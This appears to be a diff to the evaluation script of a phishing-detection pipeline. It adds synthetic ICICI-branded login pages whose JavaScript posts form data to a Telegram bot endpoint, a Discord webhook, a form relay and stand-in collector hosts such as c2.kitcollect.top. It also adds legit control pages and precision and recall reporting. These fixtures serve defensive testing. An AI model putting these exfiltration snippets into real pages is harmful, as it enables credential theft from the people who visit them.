@@ -132,6 +132,37 @@ KIT_B = KIT.replace('<div class="container">', '<section class="container"><div>
     '  </div>\n  <div class="footer">', '  </div></section>\n  <div class="footer">')
 
 
+# S3d: modern JS-kit patterns (2026-10-07). The 20 phishing pages above are static-era kits (HTML form posts); on
+# live data 0 of 427 candidates produced a strong signal because current kits are JS apps. These cases exercise
+# the code that now ships. Synthetic placeholders only: the bot token, webhook and hosts below are not real.
+_TG = "https://api.telegram.org/bot6123456789:AAF" + "q" * 32 + "/sendMessage"
+_SPA = ("<html><head><title>{brand} - Secure Login</title></head><body><div id='app'>"
+        "<input type='text' name='user' placeholder='Customer ID'><input type='password' name='pass'>"
+        "<button id='go'>Login</button>{extra}</div><script>{js}</script></body></html>")
+MODERN = {  # name: (truth, family-specific JS, extra markup, what it tests)
+    "pJ0": ("phishing", f"fetch('{_TG}',{{method:'POST',body:d}});fetch('https://panel.kitcollect.top/save',"
+                        "{method:'POST',body:d})", "", "Telegram exfil + POST to a second site"),
+    "pJ1": ("phishing", "axios.post('https://discord.com/api/webhooks/112233445566778899/AbCdEfGhIjKl', m);"
+                        "x.open('POST', 'https://c2.kitcollect.top/r')", "", "Discord webhook + XHR POST"),
+    "pJ2": ("phishing", "$.post('https://formspree.io/f/xkitform', d);$.ajax({url: 'https://drop.kitcollect.top/a',"
+                        " type: 'POST', data: d})", "", "form relay + jQuery POST"),
+    "pJ3": ("phishing", f"fetch('{_TG}'.replace('x','x'))", "", "Telegram exfil only: one strong signal"),
+    "pJ4": ("phishing", "fetch('https://panel.kitcollect.top/save',{method:'POST',body:d})", "",
+            "foreign POST only: one strong signal"),
+    "pJ5": ("phishing", "const api=axios.create({baseURL:'/dev-api/mobileUser'});api.post('/login',d)", "",
+            "same-origin relay (meesho-all.cfd pattern): invisible client-side"),
+    "pJ6": ("phishing", f"fetch('{_TG}',{{method:'POST',body:d}})", "",
+            "one Telegram endpoint seen by S1 and S2: one strong signal (S3b)"),
+    "lJ0": ("legit", "fetch('/api/session',{method:'POST',body:d});navigator.sendBeacon("
+                     "'https://www.google-analytics.com/g/collect',e);fetch('https://www.google.com/recaptcha/api2/"
+                     "reload',{method:'POST'})", "", "legit SPA: own API + analytics + captcha"),
+    "lJ1": ("legit", "", "<a href='https://t.me/icicibank'>Telegram</a><a href='https://t.me/share/url?url=x'>Share</a>",
+            "legit login with a t.me channel link and share button"),
+}
+FAMILIES = (("pA", "static_known_kit"), ("pB", "static_unknown_kit"), ("pJ", "modern_js_kit"),
+            ("lB", "legit_brand_like_login"), ("lG", "legit_blog"), ("lP", "legit_parked"), ("lJ", "modern_js_legit"))
+
+
 def _pages():
     pages = {}
     for i in range(10):  # phishing, known kit A: credential POST off-site + known kit
@@ -147,6 +178,8 @@ def _pages():
         pages[f"lG{i}"] = ("legit", f"<html><head><title>Blog post {i}</title></head><body><p>hello</p></body></html>")
     for i in range(5):
         pages[f"lP{i}"] = ("legit", "<html><title>This domain is for sale</title></html>")
+    for name, (truth, js, extra, _) in MODERN.items():
+        pages[name] = (truth, _SPA.format(brand="ICICI Bank", js=js, extra=extra))
     return pages
 
 
@@ -183,22 +216,77 @@ def confirmation():
             r = c.get(url)
             page = FetchedPage(url, url, r.status_code, r.text, dict(r.headers), [], None, None, [], "httpx")
             res = analyze_page(page, f"{name}.example", icici, known, {}, None, None)
-            rows.append((truth, res.verdict, res.strong_count))
+            rows.append((truth, res.verdict, res.strong_count, name))
     srv.shutdown()
-    tp = sum(t == "phishing" and v == "confirmed" for t, v, _ in rows)
-    fp = sum(t == "legit" and v == "confirmed" for t, v, _ in rows)
-    npos = sum(t == "phishing" for t, _, _ in rows)
-    verdicts = {}
-    for t, v, _ in rows:
+    tp = sum(t == "phishing" and v == "confirmed" for t, v, _, _ in rows)
+    fp = sum(t == "legit" and v == "confirmed" for t, v, _, _ in rows)
+    npos = sum(t == "phishing" for t, _, _, _ in rows)
+    verdicts, by_family = {}, {}
+    for t, v, _, name in rows:
         verdicts.setdefault(t, {}).setdefault(v, 0)
         verdicts[t][v] += 1
+        fam = next(f for prefix, f in FAMILIES if name.startswith(prefix))
+        b = by_family.setdefault(fam, {"truth": t, "n": 0, "confirmed": 0})
+        b["n"] += 1
+        b["confirmed"] += v == "confirmed"
     return {"precision": {"value": round(tp / (tp + fp), 4) if tp + fp else None, "confirmed": tp + fp},
             "recall": {"value": round(tp / npos, 4), "n_phishing": npos},
             "false_confirmations_of_legit_pages": fp, "verdicts_by_truth": verdicts, "n": len(rows),
-            "dataset": "45 labelled pages served over real HTTP from 127.0.0.1: 10 known-kit phishing, 10 unknown-kit "
-                       "phishing, 10 legit brand-like logins posting to the brand, 10 blogs, 5 parked; kit knowledge "
-                       "from a disjoint sample",
+            "by_family": by_family, "per_page": {name: v for _, v, _, name in rows},
+            "modern_cases": {k: v[3] for k, v in MODERN.items()},
+            "signal_strengths": {"exfil": SETTINGS.exfil_signal_strength, "js_post": SETTINGS.js_post_signal_strength},
+            "dataset": f"{len(rows)} labelled pages served over real HTTP from 127.0.0.1: 10 known-kit and 10 unknown-kit "
+                       "static-era phishing (HTML form posts), 7 modern JS-kit phishing (S3d: Telegram/Discord/form-relay "
+                       "exfil, foreign POSTs, a same-origin relay), 10 legit brand-like logins posting to the brand, "
+                       "10 blogs, 5 parked, 2 legit modern logins; kit knowledge from a disjoint sample",
             "method": "real HTTP fetch + the production analyze_page gate (>= 2 strong signals)", "measured_at": NOW()}
+
+
+# ---- live confirmation: the measured zero, its cause, the S1/S2 response (S5) ------------------------------------
+def _gate_summary(g: dict | None) -> dict | None:
+    if not g:
+        return None
+    out = {"measured_at": g["measured_at"], "dataset": g["dataset"]}
+    for sig in ("S1", "S2"):
+        x = g["gate"][sig]
+        out[sig] = {"false_positives": x["false_positives"], "legit_pages_tested": x["legit_pages_tested"],
+                    "ships_as": x["ships_as"],
+                    "false_positive_pages": [fp.get("url") or fp.get("page") for fp in x["false_positive_detail"]]}
+    out["false_positive_detail"] = {
+        sig: [{"page": fp.get("url") or fp.get("page"), "destination": h.get("origin") or h.get("match", ""),
+               "where": h.get("where", "")} for fp in g["gate"][sig]["false_positive_detail"] for h in fp["hits"][:1]]
+        for sig in ("S1", "S2")}
+    hits = [h for r in g.get("legit_rows", []) if r.get("credential_input") for h in r.get("S2", [])]
+    out["S2_hits_by_source"] = {"request fired during page load": sum(h["where"].startswith("network:") for h in hits),
+                                "page code": sum(not h["where"].startswith("network:") for h in hits)}
+    return out
+
+
+@section
+def live_confirmation():
+    """Assembled from the files the measurement scripts wrote (scripts/diagnose_confirm.py before and after the S4
+    re-check, scripts/exfil_fp_gate.py runs); nothing is recomputed or typed in here."""
+    from services.ingest.brands import load_brands
+    rep = ROOT / "reports"
+
+    def load(name):
+        f = rep / name
+        return json.loads(f.read_text(encoding="utf-8")) if f.exists() else None
+    before = load("confirm_diagnosis_before.json")
+    if before is None:
+        raise FileNotFoundError("reports/confirm_diagnosis_before.json: run scripts.diagnose_confirm --save-ids first")
+    return {"before": before, "after": load("confirm_diagnosis_after.json"),
+            "brands_total": len(load_brands(SETTINGS.brands_file).brands),
+            "gates": {"run1": _gate_summary(load("exfil_fp_gate_run1.json")),
+                      "run2": _gate_summary(load("exfil_fp_gate.json")),
+                      "run2_retest": _gate_summary(load("exfil_fp_gate_run2_retest.json")),
+                      "holdout": _gate_summary(load("exfil_fp_gate_holdout.json"))},
+            "signal_strengths": {"exfil": SETTINGS.exfil_signal_strength, "js_post": SETTINGS.js_post_signal_strength},
+            "dataset": "live public-feed candidates of the pipeline operator (org 1), capture window; the same fixed "
+                       "domain set before and after the S4 re-check",
+            "method": "scripts/diagnose_confirm.py (verdict reasons, favicon census, unreachable causes); S4 = every "
+                      "domain re-checked through the real enrichment worker with the shipped logic",
+            "measured_at": NOW()}
 
 
 # ---- email ---------------------------------------------------------------------------------------------------
@@ -466,7 +554,8 @@ def evidence_ledger():
 
 
 SECTIONS = {"evidence_ledger": evidence_ledger, "triage_threshold_options": triage_threshold_options, "triage_rules": triage_rules, "triage_model": triage_model, "ingest": ingest,
-            "confirmation": confirmation, "email": email, "response_time": response_time,
+            "confirmation": confirmation, "live_confirmation": live_confirmation, "email": email,
+            "response_time": response_time,
             "interdiction": interdiction, "lead_time_phishtank_30min": lead_time_phishtank_30min,
             "ct_capture": ct_capture, "live_pipeline_counts": live_pipeline_counts, "lead_time": lead_time}
 
